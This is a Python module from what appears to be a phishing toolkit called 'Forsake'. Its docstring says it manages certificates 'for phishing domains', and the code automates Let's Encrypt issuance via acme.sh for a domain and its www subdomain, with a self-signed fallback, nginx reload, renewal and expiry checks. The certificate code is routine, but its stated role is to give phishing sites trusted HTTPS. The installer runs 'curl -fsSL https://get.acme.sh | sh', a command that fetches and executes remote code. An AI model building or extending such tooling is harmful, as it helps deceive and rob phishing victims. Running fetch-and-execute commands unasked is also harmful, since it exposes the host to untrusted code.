"""
SSL/TLS Certificate Manager — automated Let's Encrypt via acme.sh.
Created by ANONYMOUS-BETA
"""

from pathlib import Path
from typing import Optional

from . import config as cfg
from .utils import ensure_directory, run_command


class CertManager:
    """Manages SSL/TLS certificates for phishing domains."""

    def __init__(self, forsake):
        self.forsake = forsake

    def obtain(self, domain: str, email: str = None) -> bool:
        """
        Obtain a Let's Encrypt certificate using acme.sh.
        Falls back to self-signed if issuance fails.
        """
        if not email:
            email = f"admin@{domain}"

        # Install acme.sh if not present
        if not cfg.ACME_BIN.exists():
            self._install_acme_sh(email)

        ensure_directory(cfg.CERTS_DIR)

        print(f"[*] Issuing SSL certificate for {domain}...")

        # Issue certificate (ECC preferred)
        cmd = (
            f'{cfg.ACME_BIN} --issue -d {domain} -d www.{domain} '
            f'--standalone --keylength ec-256 --force '
            f'--cert-home {cfg.CERTS_DIR} --log {cfg.LOGS_DIR / "acme.log"}'
        )
        rc, out, err = run_command(cmd, timeout=60)

        if rc == 0:
            # Install certificate to our directory
            install_cmd = (
                f'{cfg.ACME_BIN} --install-cert -d {domain} --ecc '
                f'--fullchain-file {cfg.CERTS_DIR / "fullchain.pem"} '
                f'--key-file {cfg.CERTS_DIR / "key.pem"} '
                f'--reloadcmd "systemctl reload nginx"'
            )
            run_command(install_cmd)
            print(f"[+] Let's Encrypt certificate obtained for {domain}")
            return True
        else:
            print(f"[-] Certificate issuance failed: {err}")
            print("[*] Falling back to self-signed certificate...")
            return self.generate_self_signed(domain)

    def _install_acme_sh(self, email: str):
        """Install acme.sh via the official installer."""
        print("[*] Installing acme.sh...")
        cmd = f'curl -fsSL https://get.acme.sh | sh -s email={email}'
        rc, out, err = run_command(cmd, timeout=60)
        if rc != 0:
            raise RuntimeError(f"acme.sh installation failed: {err}")
        print("[+] acme.sh installed")

    def generate_self_signed(self, domain: str) -> bool:
        """Generate a self-signed certificate as fallback."""
        print(f"[*] Generating self-signed certificate for {domain}...")
        subj = f"/C=US/ST=State/L=City/O=Forsake/CN={domain}"
        cmd = (
            f'openssl req -x509 -nodes -days 365 -newkey rsa:2048 '
            f'-keyout {cfg.CERTS_DIR / "key.pem"} '
            f'-out {cfg.CERTS_DIR / "fullchain.pem"} '
            f'-subj "{subj}"'
        )
        rc, out, err = run_command(cmd)
        if rc == 0:
            print(f"[+] Self-signed certificate generated for {domain}")
            return True
        else:
            raise RuntimeError(f"Self-signed cert generation failed: {err}")

    def renew(self) -> bool:
        """Renew all certificates managed by acme.sh."""
        print("[*] Checking for certificate renewals...")
        rc, out, err = run_command(f"{cfg.ACME_BIN} --renew-all")
        if rc == 0:
            print("[+] Certificates renewed (if needed)")
            return True
        else:
            print(f"[-] Renewal check completed with issues: {err}")
            return False

    def check_expiry(self, domain: str = None) -> Optional[int]:
        """Check days until certificate expiry."""
        cert_path = cfg.CERTS_DIR / "fullchain.pem"
        if not cert_path.exists():
            return None

        cmd = (
            f'openssl x509 -in {cert_path} -noout -enddate | '
            f'cut -d= -f2'
        )
        rc, out, err = run_command(cmd)
        if rc == 0 and out:
            from datetime import datetime
            expiry = datetime.strptime(out, "%b %d %H:%M:%S %Y %Z")
            delta = expiry - datetime.now()
            return delta.days
        return None

    def get_cert_info(self) -> dict:
        """Get information about the current certificate."""
        cert_path = cfg.CERTS_DIR / "fullchain.pem"
        if not cert_path.exists():
            return {"exists": False}

        info = {"exists": True}
        cmd = f'openssl x509 -in {cert_path} -noout -subject'
        rc, out, _ = run_command(cmd)
        if rc == 0:
            info["subject"] = out

        cmd = f'openssl x509 -in {cert_path} -noout -issuer'
        rc, out, _ = run_command(cmd)
        if rc == 0:
            info["issuer"] = out

        days = self.check_expiry()
        info["days_remaining"] = days

        return info
